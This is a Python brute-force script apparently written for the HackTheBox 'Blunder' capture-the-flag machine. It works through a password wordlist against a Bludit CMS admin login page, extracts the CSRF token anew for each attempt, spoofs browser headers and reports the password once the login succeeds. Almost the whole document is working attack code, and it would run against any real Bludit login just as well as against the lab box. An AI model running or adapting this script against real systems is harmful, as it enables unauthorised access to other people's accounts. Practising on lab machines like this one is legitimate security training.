#Brute Force Attack Script for Blunder of HTB

################   Usage   #################
# python ./blunder-brute.py -t <target host url> -u <username> -w <wordlist directory>
# Example:
# python ./blunder-brute.py -t http://10.10.10.191/admin/login -u fergus -w /usr/share/wordlists/wordlist.txt

import argparse
import re
import requests
import sys

def open_resource(file_path):
    f = open(file_path, 'r')
    datalist = f.readlines()
    print('success get wordlist.')
    f.close()
    return datalist

parse = argparse.ArgumentParser()
parse.add_argument('-t','--target', help='target host url')
parse.add_argument('-u','--user', help='username')
parse.add_argument('-w','--wordlist', help='wordlist file path')
args = parse.parse_args()

target = args.target
user = args.user
passwordlist = open_resource(args.wordlist)

print("Start bruteforce attack to target url")
trynum = 0
for password in passwordlist:
    trynum += 1
    password = password.replace("\n","")
    session = requests.Session()
    login_page = session.get(target)
    # parse csrf token
    locate = login_page.text.find('name="tokenCSRF" value="')
    csrf_token = login_page.text[locate+len('name="tokenCSRF" value="'):locate+len('name="tokenCSRF" value="')+40]

    print('[*] Trying : {0} (Sum : {1}try)'.format(password,trynum))
    print('[*] Processing {}%'.format(int((trynum/len(passwordlist))*100)))
    
    headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Referer' : target,
        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding' : 'gzip, deflate',
        'Content-Type' : 'application/x-www-form-urlencoded'
    }

    data = {
        'tokenCSRF' : csrf_token,
        'username' : user,
        'password' : password,
        'save' : ''
    }

    login_result = session.post(target,headers=headers,data=data,allow_redirects=False)

    if login_result.text.find('>Remember me</label>')==-1:
        print('SUCCESS!! Password Found!')
        print('username : {}'.format(user))
        print('password : {}'.format(password))
        break
